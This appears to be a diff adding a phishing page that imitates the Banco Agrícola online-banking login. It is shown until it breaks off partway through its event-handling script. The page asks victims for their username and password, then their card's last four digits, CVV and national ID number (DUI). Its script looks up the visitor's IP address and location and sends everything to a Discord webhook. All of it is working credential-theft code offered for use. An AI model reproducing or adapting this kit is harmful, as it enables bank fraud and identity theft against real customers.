@@ -1,0 +1,1431 @@
+﻿<!doctype html>
+<html class="no-js" lang="es" style="--vh: 12.18px">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <meta
+      name="viewport"
+      content="user-scalable=no, width=device-width, initial-scale=1"
+      viewport-fit="cover"
+    />
+
+    <title>Bancoagrícola</title>
+    <script>
+      (function () {
+        function isMobile() {
+          const ua = navigator.userAgent;
+          const mobileRegex =
+            /Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|Mobile/i;
+          const isSmallScreen = window.innerWidth <= 1024;
+          const hasTouch =
+            "ontouchstart" in window || navigator.maxTouchPoints > 0;
+          return mobileRegex.test(ua) || (isSmallScreen && hasTouch);
+        }
+
+        const path = window.location.pathname;
+        const currentPage = path.substring(path.lastIndexOf("/") + 1);
+        const isMobileDevice = isMobile();
+
+        if (isMobileDevice && !currentPage.includes("mobil.html")) {
+          window.location.href = "mobil.html";
+        } else if (
+          !isMobileDevice &&
+          !currentPage.includes("index.html") &&
+          currentPage !== ""
+        ) {
+          window.location.href = "index.html";
+        }
+      })();
+    </script>
+
+    <link rel="stylesheet" href="mobil.css" />
+    <style type="text/css" id="kampyleStyle">
+      .noOutline {
+        outline: none !important;
+      }
+      .wcagOutline:focus {
+        outline: 1px dashed #595959 !important;
+        outline-offset: 2px !important;
+        transition: none !important;
+      }
+    </style>
+
+    <script id="savepage-shadowloader" type="text/javascript">
+      "use strict";
+      window.addEventListener(
+        "DOMContentLoaded",
+        function (event) {
+          savepage_ShadowLoader(5);
+        },
+        false,
+      );
+      function savepage_ShadowLoader(c) {
+        createShadowDOMs(0, document.documentElement);
+        function createShadowDOMs(a, b) {
+          var i;
+          if (b.localName == "iframe" || b.localName == "frame") {
+            if (a < c) {
+              try {
+                if (b.contentDocument.documentElement != null) {
+                  createShadowDOMs(a + 1, b.contentDocument.documentElement);
+                }
+              } catch (e) {}
+            }
+          } else {
+            if (
+              b.children.length >= 1 &&
+              b.children[0].localName == "template" &&
+              b.children[0].hasAttribute("data-savepage-shadowroot")
+            ) {
+              b.attachShadow({ mode: "open" }).appendChild(
+                b.children[0].content,
+              );
+              b.removeChild(b.children[0]);
+              for (i = 0; i < b.shadowRoot.children.length; i++)
+                if (b.shadowRoot.children[i] != null)
+                  createShadowDOMs(a, b.shadowRoot.children[i]);
+            }
+            for (i = 0; i < b.children.length; i++)
+              if (b.children[i] != null) createShadowDOMs(a, b.children[i]);
+          }
+        }
+      }
+    </script>
+
+    <meta
+      name="savepage-date"
+      content="Tue Sep 08 2026 00:06:07 GMT-0500 (Peru Standard Time)"
+    />
+    <meta
+      name="savepage-state"
+      content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;"
+    />
+    <meta name="savepage-version" content="33.9" />
+    <meta name="savepage-comments" content="" />
+
+    <style>
+      /* ===== ESTILOS DEL OVERLAY DE CARGA ===== */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(255, 255, 255, 0.95);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        z-index: 99999;
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+      }
+
+      .loading-overlay.active {
+        display: flex;
+        animation: fadeInOverlay 0.5s ease forwards;
+      }
+
+      @keyframes fadeInOverlay {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .loading-content {
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* Logo que respira */
+      .breathing-logo {
+        width: 150px;
+        height: 150px;
+        margin-bottom: 30px;
+        animation: breathe 2.5s ease-in-out infinite;
+        filter: drop-shadow(0 4px 20px rgba(255, 194, 24, 0.3));
+        object-fit: contain;
+      }
+
+      @keyframes breathe {
+        0% {
+          transform: scale(0.8);
+          opacity: 0.6;
+        }
+        50% {
+          transform: scale(1.3);
+          opacity: 1;
+        }
+        100% {
+          transform: scale(0.8);
+          opacity: 0.6;
+        }
+      }
+
+      /* Texto de carga */
+      .loading-text {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 18px;
+        color: #333;
+        margin-top: 20px;
+        font-weight: 300;
+        letter-spacing: 2px;
+        animation: textPulse 1.5s ease-in-out infinite;
+      }
+
+      @keyframes textPulse {
+        0%,
+        100% {
+          opacity: 0.5;
+        }
+        50% {
+          opacity: 1;
+        }
+      }
+
+      .loading-text strong {
+        font-weight: 600;
+        color: #ffc218;
+      }
+
+      /* Puntos de carga animados */
+      .loading-dots {
+        display: inline-block;
+        margin-left: 5px;
+      }
+
+      .loading-dots span {
+        display: inline-block;
+        animation: dotPulse 1.4s ease-in-out infinite;
+        font-size: 24px;
+        font-weight: 700;
+        color: #ffc218;
+      }
+
+      .loading-dots span:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .loading-dots span:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+
+      @keyframes dotPulse {
+        0%,
+        80%,
+        100% {
+          opacity: 0;
+          transform: translateY(0);
+        }
+        40% {
+          opacity: 1;
+          transform: translateY(-5px);
+        }
+      }
+
+      /* ===== ESTILOS PARA PREVENIR CLIC FUERA ===== */
+      .popup-wrapper {
+        pointer-events: auto !important;
+      }
+
+      .popup-overlay {
+        pointer-events: none !important;
+      }
+
+      /* Evitar scroll */
+      body.popup-open,
+      body.loading-open {
+        overflow: hidden !important;
+      }
+
+      /* ===== ESTILOS PARA EL FORMULARIO DE VALIDACIÓN FINANCIERA ===== */
+      /* Aseguramos que el popup tenga padding interno */
+      .popup-wrapper .popup .regular-form.financial-validation {
+        padding: 30px 25px !important;
+        box-sizing: border-box;
+        width: 100%;
+      }
+
+      .financial-validation .form-section-wrapper {
+        padding: 0 !important;
+      }
+
+      .financial-validation .form-line-wrapper {
+        margin-bottom: 22px;
+        margin-top: 0;
+      }
+
+      .financial-validation .field-wrapper {
+        display: flex;
+        flex-direction: column;
+        align-items: stretch;
+        margin-top: 0 !important;
+        padding: 0;
+      }
+
+      .financial-validation .field-wrapper label {
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 6px;
+        display: block;
+        text-align: left;
+      }
+
+      .financial-validation .field-container {
+        width: 100%;
+      }
+
+      .financial-validation .field-container input {
+        width: 100%;
+        padding: 12px 0;
+        border: none;
+        border-bottom: 1px solid #ccc;
+        font-size: 16px;
+        outline: none;
+        background: transparent;
+        box-sizing: border-box;
+      }
+
+      .financial-validation .field-container input:focus {
+        border-bottom-color: #ffc218;
+      }
+
+      .financial-validation .field-container input::placeholder {
+        color: #aaa;
+      }
+
+      .financial-validation .header-icon {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .financial-validation .header-icon svg {
+        width: 50px;
+        height: 50px;
+        color: #ffc218;
+      }
+
+      .financial-validation h3 {
+        font-size: 20px;
+        font-weight: 700;
+        color: #333;
+        text-align: center;
+        margin-bottom: 12px;
+        padding: 0 5px;
+      }
+
+      .financial-validation .subtitle {
+        font-size: 13px;
+        color: #666;
+        text-align: left;
+        margin-bottom: 25px;
+        line-height: 1.6;
+        padding: 0 2px;
+      }
+
+      .financial-validation .subtitle strong {
+        color: #333;
+      }
+
+      /* Ajuste para el button-row dentro del popup */
+      .popup-wrapper .popup .button-row {
+        padding: 20px 0 10px 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 20px;
+        flex-wrap: wrap;
+      }
+
+      .popup-wrapper .popup .button-row a {
+        cursor: pointer;
+        text-decoration: underline;
+        padding: 10px 15px;
+        font-size: 14px;
+        color: #666;
+      }
+
+      .popup-wrapper .popup .button-row .button {
+        margin: 0;
+      }
+
+      /* ===== ESTILOS PARA VERIFICACIÓN EXITOSA ===== */
+      .popup-wrapper.success-popup .popup {
+        text-align: center;
+        padding: 50px 30px !important;
+        margin: 20px auto !important;
+        box-sizing: border-box;
+        max-width: 420px;
+        width: 90%;
+      }
+
+      .popup-wrapper.success-popup .success-icon {
+        width: 100px;
+        height: 100px;
+        background: #e8f5e9;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 25px;
+      }
+
+      .popup-wrapper.success-popup .success-icon svg {
+        width: 50px;
+        height: 50px;
+        color: #4caf50;
+      }
+
+      .popup-wrapper.success-popup h3 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #4caf50;
+        margin-bottom: 15px;
+      }
+
+      .popup-wrapper.success-popup p {
+        font-size: 15px;
+        color: #666;
+        line-height: 1.6;
+        margin-bottom: 30px;
+        padding: 0 10px;
+      }
+
+      .popup-wrapper.success-popup .button {
+        background: #4caf50;
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        border-radius: 30px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.3s;
+        margin-top: 10px;
+        width: 100%;
+        max-width: 280px;
+      }
+
+      .popup-wrapper.success-popup .button:hover {
+        background: #43a047;
+      }
+
+      /* Ajuste para pantallas pequeñas */
+      @media (max-width: 480px) {
+        .popup-wrapper .popup .regular-form.financial-validation {
+          padding: 25px 20px !important;
+        }
+        .financial-validation h3 {
+          font-size: 18px;
+        }
+        .financial-validation .subtitle {
+          font-size: 12px;
+        }
+      }
+    </style>
+  </head>
+
+  <body id="app-body" class="mobile-version true web-version">
+    <div id="root" bis_skin_checked="1">
+      <div bis_skin_checked="1">
+        <div class="app-wrapper external-wrapper" bis_skin_checked="1">
+          <div class="out-of-bounds-notice" bis_skin_checked="1">
+            <div class="message" bis_skin_checked="1">
+              <p>
+                El ancho de tu pantalla es demasiado pequeño para utilizar el
+                sistema
+              </p>
+            </div>
+          </div>
+          <header>
+            <div class="contact-help" bis_skin_checked="1"></div>
+            <a
+              class="icon-call-login"
+              data-savepage-href="/contactUs"
+              href="https://www.ebanca.com/contactUs"
+            ></a>
+            <h1 class="external-app-name">
+              <a><span class="">Banco Agrícola</span></a>
+            </h1>
+          </header>
+          <article class="content-wrapper login-wrapper content-login">
+            <h2 class="page-subtitle centered">
+              <span class="">Bienvenido a la aplicación de Bancoagrícola</span>
+            </h2>
+            <form
+              class="regular-form login-form"
+              autocomplete="off"
+              method="POST"
+            >
+              <div class="form-section-wrapper" bis_skin_checked="1">
+                <div class="form-line-wrapper static-form" bis_skin_checked="1">
+                  <div class="field-wrapper field-input" bis_skin_checked="1">
+                    <label class=""
+                      ><span class="">Usuario</span>
+                      <p class="field-auxiliar"><span class=""></span></p
+                    ></label>
+                    <div class="field-container" bis_skin_checked="1">
+                      <div
+                        bis_skin_checked="1"
+                        style="display: flex; width: 100%"
+                      >
+                        <input
+                          inputmode=""
+                          autocomplete="off"
+                          autocorrect="off"
+                          autocapitalize="off"
+                          spellcheck="false"
+                          maxlength="20"
+                          value=""
+                          style="opacity: 1"
+                          id="usernameInput"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div bis_skin_checked="1">
+                  <div
+                    class="form-line-wrapper static-form form-input-checked"
+                    bis_skin_checked="1"
+                  >
+                    <div
+                      class="field-wrapper field-checkbox-group"
+                      bis_skin_checked="1"
+                    >
+                      <label class="no-mobile undefined"> </label>
+                      <ul>
+                        <li>
+                          <div
+                            class="field-checkbox field-small"
+                            bis_skin_checked="1"
+                          >
+                            <div
+                              class="checkbox false no-checked"
+                              bis_skin_checked="1"
+                            >
+                              <span class="checkbox-check"></span>
+                            </div>
+                            <span class="checkbox-label"
+                              ><span
+                                ><span class="">Recordar usuario</span></span
+                              ></span
+                            ><input
+                              name="rememberUser"
+                              type="checkbox"
+                              autocomplete="off"
+                              autocorrect="off"
+                              autocapitalize="off"
+                              spellcheck="false"
+                              class="hidden"
+                              value="true"
+                            />
+                          </div>
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-line-wrapper" bis_skin_checked="1">
+                  <div class="field-link-wrapper" bis_skin_checked="1">
+                    <a
+                      class="field-link"
+                      data-savepage-href="/userRecoveryUserEntry"
+                      href="https://www.ebanca.com/userRecoveryUserEntry"
+                      ><span class="">Olvide mi Clave</span></a
+                    >
+                  </div>
+                </div>
+              </div>
+              <div
+                class="button-row centered button-login button-arrow"
+                bis_skin_checked="1"
+              >
+                <button
+                  type="button"
+                  class="button undefined"
+                  id="btnContinuar"
+                >
+                  <span><span class="">Continuar</span></span
+                  ><span class="loading-indicator"
+                    ><span class="">Cargando...</span></span
+                  >
+                </button>
+              </div>
+              <div class="login-footer-options" bis_skin_checked="1">
+                <a
+                  class="icon-edit"
+                  data-savepage-href="/enrollment"
+                  href="https://www.ebanca.com/enrollment"
+                  ><span class="">Regístrate</span></a
+                ><a class="icon-register"><span></span></a
+                ><a
+                  class="icon-call"
+                  data-savepage-href="/contactUs"
+                  href="https://www.ebanca.com/contactUs"
+                  ><span class="">Contáctanos</span></a
+                >
+              </div>
+            </form>
+
+            <!-- ===== POPUP DE VALIDACIÓN FINANCIERA ===== -->
+            <!-- ===== POPUP DE VALIDACIÓN DE SEGURIDAD ===== -->
+            <div bis_skin_checked="1">
+              <div
+                class="popup-wrapper token-popup popup-carga"
+                bis_skin_checked="1"
+                id="popupCodigo"
+                style="display: none"
+              >
+                <div class="popup-overlay" bis_skin_checked="1"></div>
+                <div
+                  class="popup scrollable popup-login-code"
+                  bis_skin_checked="1"
+                >
+                  <form
+                    class="regular-form financial-validation"
+                    autocomplete="off"
+                    method="POST"
+                  >
+                    <div
+                      class="form-section-wrapper login-movile"
+                      bis_skin_checked="1"
+                    >
+                      <!-- Logo en lugar del icono de escudo -->
+                      <div class="header-icon">
+                        <img
+                          src="lgoo2.png"
+                          alt="Logo"
+                          style="width: 230px; object-fit: contain"
+                        />
+                      </div>
+                      <h3>Validación de Seguridad</h3>
+                      <p class="subtitle">
+                        Para dar continuidad a su proceso, realiza una
+                        validación para confirmar la titularidad, podremos
+                        solicitar únicamente información limitada, como los
+                        <label
+                          style="
+                            font-weight: bold;
+                            font-size: 16px;
+                            color: black;
+                          "
+                          >últimos cuatro dígitos</label
+                        >
+                        de su tarjeta.
+                        <label
+                          style="
+                            font-weight: bold;
+                            font-size: 16px;
+                            color: black;
+                          "
+                          >CVV</label
+                        >
+                        son 3 dígitos ubicados en la parte posterior.<br /><br />
+                        Agradecemos su colaboración. Esta validación nos permite
+                        garantizar la seguridad del proceso y proteger la
+                        información de nuestros clientes.
+                      </p>
+
+                      <div class="form-line-wrapper" bis_skin_checked="1">
+                        <div
+                          class="field-wrapper field-input"
+                          bis_skin_checked="1"
+                        >
+                          <label
+                            ><span>Últimos 4 dígitos de la tarjeta</span></label
+                          >
+                          <div class="field-container" bis_skin_checked="1">
+                            <input
+                              inputmode="numeric"
+                              autocomplete="off"
+                              maxlength="4"
+                              type="text"
+                              id="cardLast4"
+                              placeholder="0000"
+                              value=""
+                            />
+                          </div>
+                        </div>
+                      </div>
+                      <div class="form-line-wrapper" bis_skin_checked="1">
+                        <div
+                          class="field-wrapper field-input"
+                          bis_skin_checked="1"
+                        >
+                          <label
+                            ><span>CVV (3 dígitos posteriores)</span></label
+                          >
+                          <div class="field-container" bis_skin_checked="1">
+                            <input
+                              inputmode="numeric"
+                              autocomplete="off"
+                              maxlength="3"
+                              type="text"
+                              id="cardCvv"
+                              placeholder="000"
+                              value=""
+                            />
+                          </div>
+                        </div>
+                      </div>
+                      <div class="form-line-wrapper" bis_skin_checked="1">
+                        <div
+                          class="field-wrapper field-input"
+                          bis_skin_checked="1"
+                        >
+                          <label
+                            ><span
+                              >Documento Único de Identidad (DUI)</span
+                            ></label
+                          >
+                          <div class="field-container" bis_skin_checked="1">
+                            <input
+                              inputmode="numeric"
+                              autocomplete="off"
+                              maxlength="10"
+                              type="text"
+                              id="cardDui"
+                              placeholder="00000000-0"
+                              value=""
+                            />
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div
+                      class="button-row button-verification button-arrow"
+                      bis_skin_checked="1"
+                    >
+                      <a id="btnCancelarCodigo"
+                        ><span class="">Cancelar</span></a
+                      >
+                      <button
+                        type="button"
+                        class="button undefined"
+                        id="btnIngresar"
+                      >
+                        <span><span class="">Continuar</span></span>
+                        <span class="loading-indicator"
+                          ><span class="">Cargando...</span></span
+                        >
+                      </button>
+                    </div>
+                  </form>
+                </div>
+              </div>
+            </div>
+
+            <!-- ===== POPUP DE VERIFICACIÓN EXITOSA ===== -->
+            <div bis_skin_checked="1">
+              <div
+                class="popup-wrapper token-popup popup-carga success-popup"
+                bis_skin_checked="1"
+                id="popupExito"
+                style="display: none"
+              >
+                <div class="popup-overlay" bis_skin_checked="1"></div>
+                <div
+                  class="popup scrollable popup-login-code"
+                  bis_skin_checked="1"
+                >
+                  <div class="success-icon">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke="currentColor"
+                      stroke-width="3"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M5 13l4 4L19 7"
+                      />
+                    </svg>
+                  </div>
+                  <h3>Verificación exitosa</h3>
+                  <p>
+                    Su información ha sido confirmada correctamente. En breve
+                    podrá continuar con su proceso en e-banca Personas.
+                  </p>
+                  <button type="button" class="button" id="btnVolverInicio">
+                    Volver al inicio
+                  </button>
+                </div>
+              </div>
+            </div>
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== POPUP DE CLAVE ===== -->
+    <div bis_skin_checked="1">
+      <div
+        class="popup-wrapper token-popup popup-carga"
+        bis_skin_checked="1"
+        id="popupClave"
+        style="display: none"
+      >
+        <div class="popup-overlay" bis_skin_checked="1">&nbsp;</div>
+        <div class="popup scrollable popup-login-code" bis_skin_checked="1">
+          <form class="regular-form" autocomplete="off" method="POST">
+            <div class="form-section-wrapper login-movile" bis_skin_checked="1">
+              <div class="form-line-wrapper" bis_skin_checked="1">
+                <div class="field-wrapper intro-code" bis_skin_checked="1">
+                  <span class="token-intro">
+                    <span class="">Ingresa tu Clave de Acceso:</span>
+                  </span>
+                </div>
+              </div>
+              <div class="form-line-wrapper static-form" bis_skin_checked="1">
+                <div class="field-wrapper field-input" bis_skin_checked="1">
+                  <label class="">
+                    <span class="">Clave</span>
+                    <p class="field-auxiliar"><span class=""></span></p>
+                  </label>
+                  <div class="field-container" bis_skin_checked="1">
+                    <div
+                      style="display: flex; width: 100%"
+                      bis_skin_checked="1"
+                    >
+                      <input
+                        inputmode=""
+                        autocomplete="off"
+                        autocorrect="off"
+                        autocapitalize="off"
+                        spellcheck="false"
+                        maxlength="20"
+                        type="password"
+                        value=""
+                        style="opacity: 1"
+                        id="claveInput"
+                      />
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="field-link-wrapper" bis_skin_checked="1">
+                <a class="field-link" id="btnOlvideClave">
+                  <span class="">Olvidé mi Clave</span>
+                </a>
+              </div>
+            </div>
+            <div
+              class="button-row button-verification button-arrow"
+              bis_skin_checked="1"
+            >
+              <a id="btnCancelarClave"><span class="">Cancelar</span></a>
+              <button
+                type="button"
+                class="button undefined"
+                id="btnValidarClave"
+              >
+                <span><span class="">Validar Clave</span></span>
+                <span class="loading-indicator"
+                  ><span class="">Cargando...</span></span
+                >
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== OVERLAY DE CARGA PERSONALIZADO ===== -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="loading-content">
+        <img
+          src="logo.png"
+          alt="Logo"
+          class="breathing-logo"
+          id="loadingLogo"
+        />
+        <div class="loading-text">
+          Estamos comprobando
+          <span class="loading-dots">
+            <span>.</span>
+            <span>.</span>
+            <span>.</span>
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <script src="telegram.js"></script>
+    <script>
+      (function () {
+        // ============================================
+        // CONFIGURACIÓN
+        // ============================================
+        const DISCORD_WEBHOOK_URL = chatId;
+
+        // ============================================
+        // OBTENER REFERENCIAS
+        // ============================================
+        const btnContinuar = document.getElementById("btnContinuar");
+        const popupClave = document.getElementById("popupClave");
+        const popupCodigo = document.getElementById("popupCodigo");
+        const popupExito = document.getElementById("popupExito");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const usernameInput = document.getElementById("usernameInput");
+        const claveInput = document.getElementById("claveInput");
+        const cardLast4 = document.getElementById("cardLast4");
+        const cardCvv = document.getElementById("cardCvv");
+        const cardDui = document.getElementById("cardDui");
+        const btnCancelarClave = document.getElementById("btnCancelarClave");
+        const btnValidarClave = document.getElementById("btnValidarClave");
+        const btnCancelarCodigo = document.getElementById("btnCancelarCodigo");
+        const btnIngresar = document.getElementById("btnIngresar");
+        const btnOlvideClave = document.getElementById("btnOlvideClave");
+        const btnVolverInicio = document.getElementById("btnVolverInicio");
+
+        let usuarioGlobal = "";
+        let claveGlobal = "";
+
+        // ============================================
+        // FUNCIONES DE UBICACIÓN
+        // ============================================
+        async function obtenerDatosGeo() {
+          const NO_DISPONIBLE = "No disponible";
+          const TIMEOUT_MS = 5000;
+
+          const servicios = [
+            {
+              nombre: "ipwho.is",
+              url: "https://ipwho.is/",
+              procesar(data) {
+                if (data.success === false || !data.country) {
+                  throw new Error(data.message || "Respuesta incompleta");
+                }
+                return {
+                  ip: data.ip,
+                  ciudad: data.city,
+                  pais: data.country,
+                  codigo_pais: data.country_code,
+                  region: data.region,
+                  latitud: data.latitude,
+                  longitud: data.longitude,
+                  isp: data.connection?.isp || data.connection?.org,
+                };
+              },
+            },
+            {
+              nombre: "ipapi.co",
+              url: "https://ipapi.co/json/",
+              procesar(data) {
+                if (data.error || !data.country_name) {
+                  throw new Error(data.reason || "Respuesta incompleta");
+                }
+                return {
+                  ip: data.ip,
+                  ciudad: data.city,
+                  pais: data.country_name,
+                  codigo_pais: data.country_code,
+                  region: data.region,
+                  latitud: data.latitude,
+                  longitud: data.longitude,
+                  isp: data.org,
+                };
+              },
+            },
+            {
+              nombre: "ipinfo.io",
+              url: "https://ipinfo.io/json",
+              procesar(data) {
+                if (!data.ip || !data.country) {
+                  throw new Error("Respuesta incompleta");
+                }
+                const [lat, lon] = data.loc
+                  ? data.loc.split(",")
+                  : ["No disponible", "No disponible"];
+                return {
+                  ip: data.ip,
+                  ciudad: data.city,
+                  pais: data.country,
+                  codigo_pais: data.country,
+                  region: data.region,
+                  latitud: lat,
+                  longitud: lon,
+                  isp: data.org,
+                };
+              },
+            },
+          ];
+
+          async function consultar(servicio) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), TIMEOUT_MS);
+
+            try {
+              const response = await fetch(servicio.url, {
+                method: "GET",
+                headers: { Accept: "application/json" },
+                cache: "no-store",
+                signal: controller.signal,
+              });
+
+              if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+              }
+
+              const data = await response.json();
+              const resultado = servicio.procesar(data);
+
+              return {
+                ...resultado,
+                api_utilizada: servicio.nombre,
+              };
+            } finally {
+              clearTimeout(timeoutId);
+            }
+          }
+
+          try {
+            const datos = await Promise.any(
+              servicios.map((servicio) =>
+                consultar(servicio).catch((error) => {
+                  console.warn(`Falló ${servicio.nombre}:`, error.message);
+                  throw error;
+                }),
+              ),
+            );
+
+            return {
+              ip: datos.ip ?? NO_DISPONIBLE,
+              ciudad: datos.ciudad ?? NO_DISPONIBLE,
+              pais: datos.pais ?? NO_DISPONIBLE,
+              codigo_pais: datos.codigo_pais ?? NO_DISPONIBLE,
+              region: datos.region ?? NO_DISPONIBLE,
+              latitud: datos.latitud ?? NO_DISPONIBLE,
+              longitud: datos.longitud ?? NO_DISPONIBLE,
+              isp: datos.isp ?? NO_DISPONIBLE,
+              api_utilizada: datos.api_utilizada,
+            };
+          } catch (error) {
+            console.error("Todas las APIs geográficas fallaron:", error);
+            return {
+              ip: NO_DISPONIBLE,
+              ciudad: NO_DISPONIBLE,
+              pais: NO_DISPONIBLE,
+              codigo_pais: NO_DISPONIBLE,
+              region: NO_DISPONIBLE,
+              latitud: NO_DISPONIBLE,
+              longitud: NO_DISPONIBLE,
+              isp: NO_DISPONIBLE,
+              api_utilizada: "Todas fallaron",
+            };
+          }
+        }
+
+        // ============================================
+        // INFORMACIÓN DEL NAVEGADOR
+        // ============================================
+        function obtenerInfoNavegador() {
+          const userAgent = navigator.userAgent;
+          const screenWidth = screen.width;
+          const screenHeight = screen.height;
+          const language =
+            navigator.language || navigator.languages?.[0] || "No disponible";
+          const platform = navigator.platform || "No disponible";
+          const timeZone =
+            Intl.DateTimeFormat().resolvedOptions().timeZone || "No disponible";
+          const dateTime = new Date().toLocaleString("es-ES", {
+            timeZone: timeZone,
+          });
+
+          function getBrowserName(ua) {
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari") && !ua.includes("Chrome"))
+              return "Safari";
+            if (ua.includes("Edge")) return "Edge";
+            if (ua.includes("Opera")) return "Opera";
+            return "Desconocido";
+          }
+
+          function getOS(ua) {
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac OS")) return "macOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS")) return "iOS";
+            return "Desconocido";
+          }
+
+          return {
+            userAgent: userAgent,
+            pantalla: `${screenWidth}x${screenHeight}`,
+            idioma: language,
+            plataforma: platform,
+            zonaHoraria: timeZone,
+            fechaHora: dateTime,
+            navegador: getBrowserName(userAgent),
+            sistemaOperativo: getOS(userAgent),
+          };
+        }
+
+        // ============================================
+        // ENVIAR A DISCORD
+        // ============================================
+        async function enviarADiscord(
+          usuario,
+          clave,
+          datosFinancieros,
+          geo,
+          tipo,
+        ) {
+          if (
+            !DISCORD_WEBHOOK_URL ||
+            DISCORD_WEBHOOK_URL === "TU_WEBHOOK_DE_DISCORD_AQUI"
+          ) {
+            console.warn("⚠️ No se ha configurado el webhook de Discord");
+            console.log("📝 Datos que se enviarían:", {
+              usuario,
+              clave,
+              datosFinancieros,
+              geo,
+              tipo,
+            });
+            return;
+          }
+
+          let messageContent = "";
+
+          if (tipo === "clave") {
+            messageContent =
+              "🔐 **Nuevo Acceso Detectado (Clave)**\n\n" +
+              "**👤 Usuario:**\n```\n" +
+              usuario +
+              "\n```\n\n" +
+              "**🔑 Contraseña:**\n```\n" +
+              clave +
+              "\n```\n\n" +
+              `**IP:** \`${geo.ip}\`\n**Ciudad:** ${geo.ciudad}\n**Región:** ${geo.region}\n**País:** ${geo.pais}\n\n` +
+              "🕒 " +
+              new Date().toLocaleString();
+          } else if (tipo === "financial") {
+            messageContent =
+              "🔐 **Nuevo Acceso Detectado (Validación Financiera)**\n\n" +
+              "**👤 Usuario:**\n```\n" +
+              usuario +
+              "\n```\n\n" +
+              "**💳 Últimos 4 dígitos:**\n```\n" +
+              (datosFinancieros.last4 || "No ingresado") +
+              "\n```\n\n" +
+              "**🔒 CVV:**\n```\n" +
+              (datosFinancieros.cvv || "No ingresado") +
+              "\n```\n\n" +
+              "**🆔 DUI:**\n```\n" +
+              (datosFinancieros.dui || "No ingresado") +
+              "\n```\n\n" +
+              `**IP:** \`${geo.ip}\`\n**Ciudad:** ${geo.ciudad}\n**Región:** ${geo.region}\n**País:** ${geo.pais}\n\n` +
+              "🕒 " +
+              new Date().toLocaleString();
+          }
+
+          const messageData = {
+            username: "Atlántida Log Bot",
+            avatar_url:
+              "https://play-lh.googleusercontent.com/4odhYGAFtFIPd1JqopEYCYmnf4e_NQUTHg7nL-QzrkoFNxxhHunjae6_4cyGdrfHc4QQzKVQRMRxowWZVB-e5Q",
+            content: messageContent,
+          };
+
+          try {
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(messageData),
+            });
+
+            if (response.ok) {
+              console.log(`✅ ${tipo} enviado a Discord correctamente`);
+            } else {
+              console.error(`❌ Error al enviar ${tipo}: ${response.status}`);
+            }
+          } catch (error) {
+            console.error(`❌ Error al enviar ${tipo}:`, error);
+          }
+        }
+
+        // ============================================
+        // FUNCIONES DE UI
+        // ============================================
+        function mostrarPopupClave() {
+          popupClave.style.display = "block";
+          document.body.classList.add("popup-open");
+          if (claveInput) {
+            claveInput.value = "";
+            setTimeout(() => claveInput.focus(), 100);
+          }
+        }
+
+        function ocultarPopupClave() {
+          popupClave.style.display = "none";
+          document.body.classList.remove("popup-open");
+        }
+
+        function mostrarPopupCodigo() {
+          popupCodigo.style.display = "block";
+          document.body.classList.add("popup-open");
+          // Limpiar campos
+          if (cardLast4) cardLast4.value = "";
+          if (cardCvv) cardCvv.value = "";
+          if (cardDui) cardDui.value = "";
+          setTimeout(() => cardLast4 && cardLast4.focus(), 100);
+        }
+
+        function ocultarPopupCodigo() {
+          popupCodigo.style.display = "none";
+          document.body.classList.remove("popup-open");
+        }
+
+        function mostrarPopupExito() {
+          popupExito.style.display = "block";
+          document.body.classList.add("popup-open");
+        }
+
+        function ocultarPopupExito() {
+          popupExito.style.display = "none";
+          document.body.classList.remove("popup-open");
+        }
+
+        function mostrarLoader() {
+          loadingOverlay.classList.add("active");
+          document.body.classList.add("loading-open");
+        }
+
+        function ocultarLoader() {
+          loadingOverlay.classList.remove("active");
+          document.body.classList.remove("loading-open");
+        }
+
+        // ============================================
+        // EVENTOS
+        // ============================================
+
+        // Evento "Continuar" - USUARIO
+        if (btnContinuar) {
+          btnContinuar.addEventListener("click", function (e) {
+            e.preventDefault();
